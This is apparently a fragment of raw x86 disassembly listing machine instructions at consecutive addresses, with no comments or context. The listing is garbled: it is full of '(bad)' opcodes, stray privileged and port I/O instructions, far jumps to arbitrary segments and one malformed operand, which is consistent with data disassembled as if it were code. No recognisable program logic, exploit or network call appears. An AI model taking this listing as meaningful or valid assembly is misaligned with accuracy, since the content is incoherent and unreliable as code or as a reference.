  420c10:	xlat   BYTE PTR ds:[ebx]
  420c11:	jb     0x420be9
  420c13:	pop    edx
  420c14:	push   esi
  420c15:	lods   eax,DWORD PTR ds:[esi]
  420c16:	cwde   
  420c17:	cs cmp al,0xab
  420c1a:	xchg   ah,ch
  420c1c:	pop    ds
  420c1d:	xchg   esp,eax
  420c1e:	add    al,0xc8
  420c20:	xor    edi,DWORD PTR [esi+eiz*8]
  420c23:	sub    BYTE PTR [ebx+ebx*1],0x13
  420c27:	inc    esp
  420c28:	test   eax,0xb0f43b7
  420c2d:	popa   
  420c2e:	aam    0xaa
  420c30:	test   al,0xdc
  420c32:	inc    DWORD PTR [ebp+0x3c8f9ae2]
  420c38:	push   cs
  420c39:	and    DWORD PTR [edi-0x18],esp
  420c3c:	scas   al,BYTE PTR es:[edi]
  420c3d:	xlat   BYTE PTR ds:[ebx]
  420c3e:	shl    edx,1
  420c40:	(bad)  
  420c41:	imul   ebp
  420c43:	pusha  
  420c44:	icebp  
  420c45:	add    BYTE PTR [ecx],bh
  420c47:	mov    eax,ds:0x68479a9c
  420c4c:	add    ch,BYTE PTR [ebx]
  420c4e:	popa   
  420c4f:	je     0x420cb2
  420c51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c52:	and    al,0x6c
  420c54:	dec    edi
  420c55:	test   ebp,edi
  420c57:	and    al,0x26
  420c59:	stos   DWORD PTR es:[edi],eax
  420c5a:	(bad)  
  420c5b:	iret   
  420c5c:	fcmovu st,st(7)
  420c5e:	and    eax,0x6804b01b
  420c63:	es pop esp
  420c65:	xchg   BYTE PTR [edi],dl
  420c67:	retf   
  420c68:	adc    esi,DWORD PTR [ecx]
  420c6a:	xchg   edi,eax
  420c6b:	mov    esi,0xcb6896b7
  420c70:	cbw    
  420c72:	adc    BYTE PTR ds:0x8d7e4e49,0x2b
  420c79:	add    al,0x55
  420c7b:	xor    ch,ch
  420c7d:	outs   dx,BYTE PTR ds:[esi]
  420c7e:	lahf   
  420c7f:	cwde   
  420c80:	mov    dh,0x44
  420c82:	shl    BYTE PTR ds:0x5bdaa6e0,cl
  420c88:	or     ecx,DWORD PTR [ecx-0x263b04af]
  420c8e:	pop    esi
  420c8f:	lahf   
  420c90:	xor    bl,BYTE PTR [edi]
  420c92:	cmp    ebx,ebp
  420c94:	sbb    eax,0xb8bd8e9b
  420c99:	adc    dl,BYTE PTR [ebp+0x44e88ae7]
  420c9f:	sar    BYTE PTR [esi],1
  420ca1:	aad    0x37
  420ca3:	and    esi,esp
  420ca5:	cli    
  420ca6:	mov    bl,0xcf
  420ca8:	nop
  420ca9:	test   BYTE PTR [esi],bl
  420cab:	cdq    
  420cac:	(bad)  
  420cad:	jg     0x420d23
  420caf:	jmp    0x420caf
  420cb1:	pop    ds
  420cb2:	jp     0x420cb8
  420cb4:	dec    esp
  420cb5:	jg     0x420ce3
  420cb7:	out    0x1a,al
  420cb9:	jp     0x420d07
  420cbb:	scas   al,BYTE PTR es:[edi]
  420cbc:	pop    esp
  420cbd:	lahf   
  420cbe:	jg     0x420d03
  420cc0:	pop    ecx
  420cc1:	inc    eax
  420cc2:	sbb    edi,ecx
  420cc4:	pop    es
  420cc5:	scas   eax,DWORD PTR es:[edi]
  420cc6:	mov    eax,0x3ec4a43b
  420ccb:	mov    cl,0xec
  420ccd:	jns    0x420cc0
  420ccf:	lods   al,BYTE PTR ds:[esi]
  420cd0:	arpl   WORD PTR [ebp-0x6b],bx
  420cd3:	ror    DWORD PTR [eax+edx*8+0x4ee9dcb1],0x5b
  420cdb:	push   eax
  420cdc:	inc    ebp
  420cdd:	mov    WORD PTR [ecx+eax*8],cs
  420ce0:	and    ebx,DWORD PTR [edx+ebx*2]
  420ce3:	dec    ecx
  420ce4:	xchg   edx,eax
  420ce5:	fdivr  QWORD PTR [eax*1+0x7865ffe9]
  420cec:	scas   eax,DWORD PTR es:[edi]
  420ced:	push   edi
  420cee:	scas   eax,DWORD PTR es:[edi]
  420cef:	scas   eax,DWORD PTR es:[edi]
  420cf0:	push   esi
  420cf1:	xor    cl,BYTE PTR [esi+0x382fcda2]
  420cf7:	xchg   esi,eax
  420cf8:	xchg   ecx,eax
  420cf9:	and    eax,0xc37d6fb7
  420cfe:	pop    ss
  420cff:	cld    
  420d00:	stos   DWORD PTR es:[edi],eax
  420d01:	mov    ecx,0x207f8a6a
  420d06:	loopne 0x420ce8
  420d08:	jecxz  0x420cd1
  420d0a:	or     eax,0x63166770
  420d0f:	pop    ebp
  420d10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d11:	push   cs
  420d12:	sub    eax,0xd5615795
  420d17:	mov    ch,0x45
  420d19:	cmp    DWORD PTR [edx-0x18a507fc],esp
  420d1f:	lahf   
  420d20:	pop    esp
  420d21:	call   0x7422d724
  420d26:	neg    BYTE PTR [esi+0x12]
  420d29:	jnp    0x420d93
  420d2b:	(bad)  
  420d2c:	out    0x81,al
  420d2e:	mov    bh,0x4
  420d30:	push   ss
  420d31:	shl    DWORD PTR [edx-0x76],1
  420d34:	mov    esp,esi
  420d36:	test   ah,cl
  420d38:	(bad)  [eax-0x62b6227a]
  420d3e:	inc    esi
  420d3f:	nop
  420d40:	fsub   DWORD PTR [esi-0x44dfee39]
  420d46:	sub    ah,al
  420d48:	pop    es
  420d49:	in     al,dx
  420d4a:	and    dh,ch
  420d4c:	pop    ds
  420d4d:	jp     0x420dc1
  420d4f:	sti    
  420d50:	cmc    
  420d51:	mov    ch,0x7b
  420d53:	adc    ebx,edi
  420d55:	mul    DWORD PTR [edx-0x61]
  420d58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420d59:	mov    ebp,0x31f708ef
  420d5e:	(bad)  
  420d5f:	inc    ecx
  420d60:	xchg   BYTE PTR [edi],dl
  420d62:	std    
  420d63:	gs sbb ebp,DWORD PTR ds:[ecx-0x51d90435]
  420d6b:	mov    ecx,0x9e8fcc4c
  420d70:	es pop ebp
  420d72:	test   BYTE PTR [eax+0x3ff2b265],dl
  420d78:	adc    BYTE PTR [edx+0xd68dac4],dh
  420d7e:	jb     0x420d0e
  420d80:	or     ch,BYTE PTR [eax+0x23]
  420d83:	iret   
  420d84:	pop    ax
  420d86:	outs   dx,DWORD PTR ds:[esi]
  420d87:	mov    ah,0x5e
  420d89:	or     al,0xa1
  420d8b:	js     0x420d4f
  420d8d:	sub    al,BYTE PTR [edx+0x58]
  420d90:	mov    ebp,0xb4fa3f06
  420d95:	into   
  420d96:	cmp    esp,ebx
  420d98:	inc    esi
  420d99:	adc    cl,BYTE PTR [ebx]
  420d9b:	mov    bl,dl
  420d9d:	ret    
  420d9e:	retf   0x872d
  420da1:	icebp  
  420da2:	sub    al,0x9b
  420da4:	or     DWORD PTR [eax],esp
  420da6:	or     eax,0x6371b916
  420dab:	sbb    ecx,ecx
  420dad:	int    0xb5
  420daf:	je     0x420d8b
  420db1:	cmp    eax,edx
  420db3:	jne    0x420d8f
  420db5:	popf   
  420db6:	push   cs
  420db7:	call   0x8c2b2429
  420dbc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420dbd:	or     DWORD PTR [eax],ecx
  420dbf:	cmp    ax,0xbce
  420dc3:	fwait
  420dc4:	cli    
  420dc5:	mov    ds:0x22019b80,al
  420dca:	mov    ecx,DWORD PTR [ebx+0x572096b0]
  420dd0:	inc    edi
  420dd1:	xor    ah,BYTE PTR [edx+0x45]
  420dd4:	pushf  
  420dd5:	mov    ch,0x39
  420dd7:	lahf   
  420dd8:	fld    QWORD PTR [ebp+0x46]
  420ddb:	out    0xef,eax
  420ddd:	(bad)  
  420dde:	iret   
  420ddf:	icebp  
  420de0:	fist   WORD PTR ds:0xae07ea98
  420de6:	jge    0x420db5
  420de8:	and    al,0x51
  420dea:	daa    
  420deb:	inc    cl
  420ded:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420dee:	test   eax,0x6880ce64
  420df3:	push   eax
  420df4:	xchg   ebp,eax
  420df5:	push   ecx
  420df6:	test   DWORD PTR ds:0xa7770555,0xd7f9ee62
  420e00:	in     eax,dx
  420e01:	inc    eax
  420e02:	dec    ebx
  420e03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420e04:	cwde   
  420e05:	into   
  420e06:	mov    eax,esi
  420e08:	sar    dh,1
  420e0a:	jno    0x420e63
  420e0c:	(bad)  
  420e0d:	je     0x420e1d
  420e0f:	xor    dh,BYTE PTR [edx+0x71]
  420e12:	sub    ebx,DWORD PTR [edx+0x62]
  420e15:	mov    ah,0x6e
  420e17:	rcl    DWORD PTR [eax],0xd5
  420e1a:	and    eax,0xf0cdb741
  420e1f:	jb     0x420dc8
  420e21:	out    0xb,al
  420e23:	outs   dx,BYTE PTR ds:[esi]
  420e24:	enter  0x816f,0x47
  420e28:	xchg   BYTE PTR [ebp-0x5d525e43],bh
  420e2e:	mov    BYTE PTR [edx-0x3f122c47],dl
  420e34:	push   es
  420e35:	jp     0x420e4c
  420e37:	adc    ebp,esp
  420e39:	xchg   esi,eax
  420e3a:	stos   DWORD PTR es:[edi],eax
  420e3b:	enter  0x9788,0xed
  420e3f:	push   esi
  420e40:	outs   dx,BYTE PTR ds:[esi]
  420e41:	dec    edi
  420e42:	sbb    BYTE PTR [ebp+0x3e46f3f2],al
  420e48:	add    al,0xff
  420e4a:	jp     0x420df3
  420e4c:	(bad)  
  420e4d:	jae    0x420e52
  420e4f:	and    DWORD PTR [esi+0x5beebb79],edx
  420e55:	hlt    
  420e56:	ret    0x8c70
  420e59:	ins    DWORD PTR es:[edi],dx
  420e5a:	leave  
  420e5b:	mov    eax,ebx
  420e5d:	or     esi,ebp
  420e5f:	mov    al,0x53
  420e61:	hlt    
  420e62:	stos   BYTE PTR es:[edi],al
  420e63:	push   edi
  420e64:	call   0xb14b:0xbbaa8b4c
  420e6b:	push   DWORD PTR [ebx]
  420e6d:	sbb    ecx,ebp
  420e6f:	add    BYTE PTR [ebx-0x3],al
  420e72:	fdivr  DWORD PTR ds:0x1c1fdd84
  420e78:	jne    0x420e42
  420e7a:	jmp    0x420ed1
  420e7c:	xchg   DWORD PTR [edx],ecx
  420e7e:	into   
  420e7f:	cmp    DWORD PTR [ecx-0x5b814450],ecx
  420e85:	dec    esi
  420e86:	leave  
  420e87:	sbb    edi,ebp
  420e89:	xchg   esp,eax
  420e8a:	push   eax
  420e8b:	cmp    eax,edx
  420e8d:	push   cs
  420e8e:	in     eax,0x99
  420e90:	cmp    bl,bh
  420e92:	xchg   esi,eax
  420e93:	mov    bh,0x64
  420e95:	sti    
  420e96:	sar    DWORD PTR [edi-0x6d52ba0c],0xcc
  420e9d:	jle    0x420e59
  420e9f:	mov    ebp,0x5556323e
  420ea4:	and    ebp,esi
  420ea6:	les    ebx,FWORD PTR [ecx+esi*2+0x465b8faa]
  420ead:	fs movzx ebp,cx
  420eb1:	push   esp
  420eb2:	inc    edx
  420eb3:	jle    0x420f0c
  420eb5:	jns    0x420ec0
  420eb7:	jne    0x420e64
  420eb9:	jmp    0xc9c7bad1
  420ebe:	aam    0x8
  420ec0:	pusha  
  420ec1:	dec    edx
  420ec2:	retf   
  420ec3:	rcl    BYTE PTR [ebx],0xd3
  420ec6:	adc    ah,BYTE PTR [ecx]
  420ec8:	mov    al,0x4c
  420eca:	bound  edx,QWORD PTR [ebp+0x6f]
  420ecd:	xchg   ebx,eax
  420ece:	inc    esi
  420ecf:	lea    esi,[edi]
  420ed1:	push   ecx
  420ed2:	push   eax
  420ed3:	mov    WORD PTR [esi+eax*1],es
  420ed6:	enter  0xfa46,0x45
  420eda:	jnp    0x420f1d
  420edc:	(bad)  
  420edd:	pop    eax
  420ede:	cld    
  420edf:	add    eax,0xb8ce33d9
  420ee4:	jl     0x420e7f
  420ee6:	xchg   esi,eax
  420ee7:	mov    ch,0x6f
  420ee9:	push   edx
  420eea:	fwait
  420eeb:	pop    ebp
  420eec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420eed:	retf   
  420eee:	ja     0x420eb0
  420ef0:	push   0x6f
  420ef2:	(bad)  
  420ef3:	pushf  
  420ef4:	mov    eax,ds:0x603f124c
  420ef9:	cmp    eax,0x3548449c
  420efe:	xor    eax,0x79961981
  420f03:	adc    DWORD PTR [ebx-0x6962f28c],ecx
  420f09:	in     eax,0xe3
  420f0b:	scas   al,BYTE PTR es:[edi]
  420f0c:	outs   dx,DWORD PTR ds:[esi]
  420f0d:	jge    0x420f5a
  420f0f:	sbb    al,0x5a
  420f11:	push   0xffffff89
  420f13:	enter  0xa814,0x30
  420f17:	xchg   DWORD PTR [eax+0x656f8f8a],ebp
  420f1d:	not    esp
  420f1f:	je     0x420eba
  420f21:	jle    0x420f5e
  420f23:	jns    0x420ef1
  420f25:	push   ds
  420f26:	push   ss
  420f27:	inc    esi
  420f28:	fwait
  420f29:	in     al,0x55
  420f2b:	(bad)  
  420f2c:	jl     0x420ec5
  420f2e:	cwde   
  420f2f:	(bad)  
  420f30:	icebp  
  420f31:	and    bl,BYTE PTR [ebp+eax*2+0x6c8e64ce]
  420f38:	adc    eax,0x53c0cde1
  420f3d:	dec    ebx
  420f3e:	(bad)  [edx]
  420f40:	stos   BYTE PTR es:[edi],al
  420f41:	(bad)  
  420f42:	inc    edi
  420f43:	je     0x420fba
  420f45:	push   cs
  420f46:	in     al,0x3d
  420f48:	mov    BYTE PTR [edi+0x1e],0xd7
  420f4c:	addr16 push esp
  420f4e:	aas    
  420f4f:	in     al,0x55
  420f51:	fwait
  420f52:	xor    ebp,ebp
  420f54:	sbb    cl,BYTE PTR [edx-0x15e3f1c]
  420f5a:	scas   al,BYTE PTR es:[edi]
  420f5b:	push   cs
  420f5c:	push   ebp
  420f5d:	inc    ebp
  420f5e:	aad    0x99
  420f60:	mov    eax,ds:0x9ffea0da
  420f65:	out    dx,al
  420f66:	repnz inc edi
  420f68:	ror    DWORD PTR [edi+0x7f],cl
  420f6b:	ficomp DWORD PTR [eax]
  420f6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420f6e:	inc    edx
  420f6f:	mov    ds:0x7633ffa2,eax
  420f74:	pop    edi
  420f75:	xchg   esi,eax
  420f76:	cmp    eax,DWORD PTR [ebx]
  420f78:	mov    esp,DWORD PTR [esp+ecx*1-0x5]
  420f7c:	les    edx,FWORD PTR [edx+0x2]
  420f7f:	or     BYTE PTR [edx+0x2e],bh
  420f82:	ror    DWORD PTR [ebp-0x4b67e33d],0x74
  420f89:	push   ebx
  420f8a:	cld    
  420f8b:	shr    ebp,cl
  420f8d:	jmp    0x420ffd
  420f8f:	xchg   esi,eax
  420f90:	push   esp
  420f91:	fwait
  420f92:	retf   0x579a
  420f95:	xor    eax,0x8fdadd97
  420f9a:	add    al,0x8e
  420f9c:	jl     0x420f21
  420f9e:	mov    al,ds:0x45b6c843
  420fa3:	(bad)  
  420fa4:	lock mov edi,DWORD PTR [ecx]
  420fa7:	cmp    al,0xa6
  420fa9:	fimul  WORD PTR [ecx+eiz*4]
  420fac:	lahf   
  420fad:	shl    BYTE PTR [edi],1
  420faf:	mov    eax,ds:0xe9587601
  420fb4:	xor    al,0x8b
  420fb6:	outs   dx,DWORD PTR ds:[esi]
  420fb7:	pop    ecx
  420fb8:	into   
  420fb9:	lsl    eax,WORD PTR [edi-0x5b294226]
  420fc0:	call   0x7d76:0x4508dd3f
  420fc7:	je     0x420f52
  420fc9:	inc    edi
  420fca:	aam    0xcf
  420fcc:	pop    ss
  420fcd:	add    ebx,DWORD PTR [ecx+0x61452fd5]
  420fd3:	inc    ebp
  420fd4:	outs   dx,DWORD PTR ds:[esi]
  420fd5:	inc    ecx
  420fd6:	xchg   ebx,eax
  420fd7:	xor    cl,BYTE PTR ds:0x4959ad50
  420fdd:	or     ebx,esp
  420fdf:	dec    edx
  420fe0:	(bad)  
  420fe2:	aad    0xea
  420fe4:	daa    
  420fe5:	mov    DWORD PTR [ecx],eax
  420fe7:	rcl    DWORD PTR [edi+ebx*8],1
  420fea:	test   al,0x9f
  420fec:	int3   
  420fed:	sub    al,BYTE PTR [ebp+0x258985d0]
  420ff3:	mov    bh,0x6d
  420ff5:	in     al,dx
  420ff6:	jmp    0x421059
  420ff8:	mov    fs,WORD PTR [esi]
  420ffa:	or     al,0x89
  420ffc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ffd:	xor    al,0x35
  420fff:	fist   WORD PTR [edx+edi*8+0x33]
  421003:	jnp    0x420ffd
  421005:	leave  
  421006:	pop    ebp
  421007:	ds jnp 0x420fa4
  42100a:	jne    0x420f9a
  42100c:	inc    edi
  42100d:	rol    DWORD PTR [ecx+0x3fb01546],0x5a
  421014:	add    eax,0xf277be17
  421019:	adc    DWORD PTR [edi-0x13f8d4de],esi
  42101f:	cli    
  421020:	mov    edx,0xc4167510
  421025:	bound  ebp,QWORD PTR [eax-0x12]
  421028:	inc    edx
  421029:	inc    edi
  42102a:	fdivp  st(6),st
  42102c:	sbb    eax,0x25c2d7ab
  421031:	mov    ch,cl
  421033:	outs   dx,BYTE PTR ds:[esi]
  421034:	pcmpgtd mm2,QWORD PTR [edi-0x4a]
  421038:	and    DWORD PTR [ebp-0x4ee1bb60],0xffffffd3
  42103f:	pop    ecx
  421040:	mov    ch,0x85
  421042:	icebp  
  421043:	retf   
  421044:	ret    
  421045:	test   al,0xc
  421047:	xor    BYTE PTR [edx+0x2e3cee93],bh
  42104d:	push   edi
  42104e:	aaa    
  42104f:	xor    DWORD PTR [ecx],0xffffffef
  421052:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421053:	rcl    BYTE PTR [esi-0x69],cl
  421056:	jg     0x42101e
  421058:	adc    eax,edx
  42105a:	in     eax,0xed
  42105c:	jmp    DWORD PTR [ecx+0x4ec60c28]
  421062:	mov    ds:0x81191160,al
  421067:	in     eax,0xbc
  421069:	push   edx
  42106a:	add    al,0xb1
  42106c:	sbb    DWORD PTR [esi+ebx*4+0x79aeffe7],esi
  421073:	adc    eax,0x386a8d26
  421078:	aas    
  421079:	pop    ecx
  42107a:	cmp    bh,cl
  42107c:	mov    BYTE PTR [ecx-0x15fe8bf6],ah
  421082:	xchg   ecx,eax
  421083:	and    eax,0x8b34be3a
  421088:	sub    BYTE PTR [ebx+ebx*4],0x85
  42108c:	jl     0x42108e
  42108e:	inc    edx
  42108f:	stos   BYTE PTR es:[edi],al
  421090:	aas    
  421091:	xchg   BYTE PTR cs:[edx-0x32e7288],ch
  421098:	dec    edx
  421099:	or     esp,DWORD PTR [edi]
  42109b:	sti    
  42109c:	call   0xa7ad:0xf84fcde5
  4210a3:	mov    esi,DWORD PTR [ecx+0x1aec784b]
  4210a9:	and    BYTE PTR [esi-0x6a],dl
  4210ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4210ad:	stos   DWORD PTR es:[edi],eax
  4210ae:	mov    ebx,DWORD PTR [ebp+0x30]
  4210b1:	rol    ebx,1
  4210b3:	xchg   esp,eax
  4210b4:	cwde   
  4210b5:	and    eax,0x4c1e0fac
  4210ba:	jb     0x4210d7
  4210bc:	pop    ebx
  4210bd:	mov    ebp,0x8434db13
  4210c2:	xor    BYTE PTR [edi-0x2a760cec],ah
  4210c8:	pop    gs
  4210ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4210cb:	sbb    ch,al
  4210cd:	loope  0x421076
  4210cf:	jge    0x421136
  4210d1:	enter  0x89a0,0xba
  4210d5:	ret    
  4210d6:	dec    ebp
  4210d7:	mov    esp,0x4daf59
  4210dc:	scas   al,BYTE PTR es:[edi]
  4210dd:	dec    ebx
  4210de:	push   ss
  4210df:	and    eax,0x3d2c1db2
  4210e4:	inc    edx
  4210e5:	fidivr WORD PTR [ecx+0x56]
  4210e8:	mov    dl,al
  4210ea:	jnp    0x4210f7
  4210ec:	mov    ecx,0x4d623e9e
  4210f1:	adc    al,0x61
  4210f3:	jle    0x42107b
  4210f5:	mov    cl,0xbc
  4210f7:	dec    eax
  4210f8:	or     al,0xbf
  4210fa:	mov    al,0xd8
  4210fc:	pop    esp
  4210fd:	xchg   dl,al
  4210ff:	hlt    
  421100:	jmp    0x4880:0x3dcfac13
  421107:	aas    
  421108:	xor    BYTE PTR [edx+0x4b],dl
  42110b:	mov    cl,0xa5
  42110d:	stos   DWORD PTR es:[edi],eax
  42110e:	(bad)  
  421110:	fadd   DWORD PTR [esi-0x70e39123]
  421116:	jmp    0x16d2:0xadab3fe7
  42111d:	iret   
  42111e:	test   dh,dl
  421120:	and    cl,dh
  421122:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421123:	sbb    al,0xfc
  421125:	in     eax,dx
  421126:	pop    ecx
  421127:	mov    al,0x33
  421129:	ret    
  42112a:	popa   
  42112b:	jp     0x4210e8
  42112d:	popa   
  42112e:	xchg   esp,eax
  42112f:	inc    esi
  421130:	punpckhdq mm2,QWORD PTR [edx]
  421133:	xchg   esi,edi
  421135:	es inc eax
  421137:	lahf   
  421138:	xchg   ebx,eax
  421139:	push   ss
  42113a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42113b:	loopne 0x4211bb
  42113d:	mov    ds:0xe7fe410c,eax
  421142:	idiv   DWORD PTR [ecx-0x7cf2c33a]
  421148:	cli    
  421149:	xchg   ebp,eax
  42114a:	mov    ebp,0xfc24a100
  42114f:	ret    0x8369
  421152:	jp     0x42119b
  421154:	imul   edx,DWORD PTR [eax-0x7e],0x2bdf71b9
  42115b:	scas   al,BYTE PTR es:[edi]
  42115c:	ins    BYTE PTR es:[edi],dx
  42115d:	inc    ebx
  42115e:	int3   
  42115f:	ja     0x42119e
  421161:	cmp    DWORD PTR [ebx-0xf],0xffffffe6
  421165:	ins    BYTE PTR es:[edi],dx
  421166:	inc    eax
  421167:	cmp    al,0x34
  421169:	jp     0x421117
  42116b:	mov    cl,0x5e
  42116d:	dec    eax
  42116e:	mov    ?,WORD PTR ds:0x98cb09be
  421174:	cwde   
  421175:	cli    
  421176:	jno    0x42113e
  421178:	or     BYTE PTR [ebx],dh
  42117a:	fwait
  42117b:	add    ch,BYTE PTR [eax+0x62]
  42117e:	hlt    
  42117f:	push   ebp
  421180:	sub    eax,0x8dccf6e4
  421185:	cld    
  421186:	mov    bl,0x8f
  421188:	mov    bh,dl
  42118a:	in     eax,dx
  42118b:	xor    al,0xc9
  42118d:	ins    DWORD PTR es:[edi],dx
  42118e:	mov    dl,0x3d
  421190:	pop    ecx
  421191:	in     al,dx
  421192:	int    0x38
  421194:	adc    al,0xf9
  421196:	add    dh,dl
  421198:	xchg   edx,eax
  421199:	in     eax,dx
  42119a:	sbb    bl,BYTE PTR [ecx]
  42119c:	lahf   
  42119d:	sbb    eax,DWORD PTR [eax]
  42119f:	test   BYTE PTR [ebx],ah
  4211a1:	jge    0x421133
  4211a3:	jno    0x421135
  4211a5:	mov    al,BYTE PTR [ecx]
  4211a7:	and    esp,0x71912aef
  4211ad:	shl    BYTE PTR es:[ecx+0xda6d734],cl
  4211b4:	test   al,0x2b
  4211b6:	jmp    0x3ad8:0xc0c8de26
  4211bd:	imul   ecx,edi,0xffffffea
  4211c0:	mov    cl,0x8c
  4211c2:	lods   eax,DWORD PTR ds:[esi]
  4211c3:	mov    BYTE PTR [edx],dl
  4211c5:	and    BYTE PTR [ebx+0x38],cl
  4211c8:	jg     0x4211f0
  4211ca:	xor    edi,DWORD PTR [ecx+0x1d80e17a]
  4211d0:	test   al,0x1b
  4211d2:	sub    BYTE PTR [ebp-0x7394ae8c],ch
  4211d8:	retf   
  4211d9:	push   DWORD PTR [edx]
  4211db:	dec    eax
  4211dc:	jo     0x4211cf
  4211de:	xlat   BYTE PTR ds:[ebx]
  4211df:	ja     0x421168
  4211e1:	jno    0x421241
  4211e3:	mov    edx,0xd4957ba7
  4211e8:	mov    dh,0xf9
  4211ea:	cmp    eax,0xda70db4f
  4211ef:	jo     0x42119c
  4211f1:	in     al,0x70
  4211f3:	cmp    DWORD PTR [edi+0x42],0xd
  4211f7:	xchg   esp,eax
  4211f8:	popf   
  4211f9:	das    
  4211fa:	xchg   DWORD PTR [eax+0xf7ad361],esi
  421200:	or     DWORD PTR [edi+0x37],eax
  421203:	cmp    DWORD PTR [ebx-0x3a],ebx
  421206:	cld    
  421207:	bound  esp,QWORD PTR [ebp-0x5a1f2b5c]
  42120d:	cld    
  42120e:	xor    DWORD PTR [ecx-0x2c],ebp
  421211:	inc    edx
  421212:	arpl   WORD PTR [eax+esi*4-0x73],ax
  421216:	sti    
  421217:	sar    ch,cl
  421219:	sbb    eax,0x88c65670
  42121e:	or     dh,BYTE PTR [edx]
  421220:	xchg   esi,eax
  421221:	test   eax,edi
  421223:	xor    al,0x72
  421225:	or     ch,BYTE PTR [edi+0x5a]
  421228:	ins    BYTE PTR es:[edi],dx
  421229:	inc    ebx
  42122a:	in     eax,dx
  42122b:	cmp    BYTE PTR [edx+0x5c],0xa0
  42122f:	inc    ecx
  421230:	or     bl,ch
  421232:	shl    DWORD PTR ds:0xd95e31c6,cl
  421238:	jno    0x421291
  42123a:	sub    dh,BYTE PTR [ebx]
  42123c:	mov    dh,0x27
  42123e:	pop    esp
  42123f:	xchg   ch,dh
  421241:	inc    ebp
  421242:	lahf   
  421243:	in     al,dx
  421244:	or     BYTE PTR [edi+0x10],0x21
  421248:	fistp  QWORD PTR [ebx+0x12283310]
  42124e:	cmp    DWORD PTR [ecx],eax
  421250:	xor    eax,DWORD PTR [ebx-0x7f]
  421253:	sbb    DWORD PTR [ebx+0x540b76a6],eax
  421259:	or     eax,0x5e39f572
  42125e:	repnz xchg ecx,eax
  421260:	(bad)  
  421261:	jb     0x42128c
  421263:	scas   al,BYTE PTR es:[edi]
  421264:	test   eax,0xe4d871d4
  421269:	paddb  mm3,QWORD PTR [ebx+0x6caac1e3]
  421270:	xlat   BYTE PTR ds:[ebx]
  421271:	jne    0x421221
  421273:	imul   esp,edi,0x25be870f
  421279:	adc    BYTE PTR [ecx+0x5c8b3889],dl
  42127f:	shl    DWORD PTR [esi*4+0x3380ee22],0xc5
  421287:	or     ecx,edi
  421289:	jle    0x4212a7
  42128b:	arpl   WORD PTR [esi+0x67706a9b],dx
  421291:	stos   BYTE PTR es:[edi],al
  421292:	(bad)  
  421293:	retf   0x26ef
  421296:	cmp    eax,0xb3497083
  42129b:	add    BYTE PTR [ecx],bl
  42129d:	stos   BYTE PTR es:[edi],al
  42129e:	push   ebx
  42129f:	pop    esp
  4212a0:	call   0xd48060c3
  4212a5:	or     al,0xc8
  4212a7:	fld    QWORD PTR [ebp+0x36]
  4212aa:	cmp    eax,eax
  4212ac:	pop    ebp
  4212ad:	sub    dh,BYTE PTR [ebx]
  4212af:	sub    DWORD PTR [esp+edx*8],eax
  4212b2:	inc    ebp
  4212b3:	dec    edi
  4212b4:	sbb    ebx,ecx
  4212b6:	jmp    DWORD PTR [ecx-0x4e]
  4212b9:	dec    edi
  4212ba:	or     bl,BYTE PTR [edi]
  4212bc:	pop    ebp
  4212bd:	jns    0x4212ad
  4212bf:	and    bl,ah
  4212c1:	ja     0x42132d
  4212c3:	mov    edx,0xe04f768e
  4212c8:	in     al,0x54
  4212ca:	sbb    DWORD PTR [eax-0x50],ebx
  4212cd:	bound  eax,QWORD PTR ds:0xf6fbb496
  4212d3:	sbb    eax,0xe9ac08d
  4212d8:	push   0xffffffb2
  4212da:	inc    edi
  4212db:	xor    dl,dl
  4212dd:	pop    ecx
  4212de:	test   eax,0xe9d08d2a
  4212e3:	bound  eax,QWORD PTR [edi+0x13]
  4212e6:	dec    ebp
  4212e7:	inc    eax
  4212e8:	pop    ebx
  4212e9:	sbb    al,0xdd
  4212eb:	imul   esp,DWORD PTR [esi+0x4a],0xa1051166
  4212f2:	jno    0x4212cf
  4212f4:	test   BYTE PTR [ebp+0x66a117af],ch
  4212fa:	mov    edi,0xcac7afc1
  4212ff:	cmc    
  421300:	ins    BYTE PTR es:[edi],dx
  421301:	mov    es,WORD PTR [ebp-0x665e963d]
  421307:	mov    eax,ds:0x4d606e68
  42130c:	cmp    eax,DWORD PTR [edi]
  42130e:	cmp    al,0x19
  421310:	loop   0x42131c
  421312:	push   esp
  421313:	dec    edx
  421314:	dec    edi
  421315:	shr    ah,cl
  421317:	pop    ecx
  421318:	cdq    
  421319:	fcom   QWORD PTR [edx+0x38a9ed09]
  42131f:	popf   
  421320:	sbb    al,0x37
  421322:	dec    ecx
  421323:	jp     0x4212b0
  421325:	in     eax,dx
  421326:	loopne 0x42139c
  421328:	or     al,BYTE PTR [ecx+esi*1-0x36]
  42132c:	stos   BYTE PTR es:[edi],al
  42132d:	cmp    DWORD PTR [eax-0x512df1b2],esi
  421333:	pop    esi
  421334:	(bad)  
  421335:	xor    esi,DWORD PTR [eax-0x64]
  421338:	jp     0x4213ab
  42133a:	inc    eax
  42133b:	dec    ecx
  42133c:	dec    ebx
  42133d:	les    ecx,FWORD PTR [ebx+0x18]
  421340:	(bad)  
  421342:	arpl   WORD PTR [edi],bx
  421344:	(bad)  
  421345:	ja     0x42138d
  421347:	inc    edx
  421348:	or     al,ah
  42134a:	cmp    dl,dl
  42134c:	sub    dh,ch
  42134e:	push   ds
  42134f:	push   ds
  421350:	neg    DWORD PTR [ebp+0x50]
  421353:	aas    
  421354:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421356:	dec    esi
  421357:	add    eax,0xdc007bd5
  42135c:	test   eax,0x5e8cebc7
  421361:	mov    ebp,esi
  421363:	mov    ds:0x173c339f,al
  421368:	cmp    al,al
  42136a:	shl    bh,cl
  42136c:	fstp   QWORD PTR [edi+0xc]
  42136f:	dec    ecx
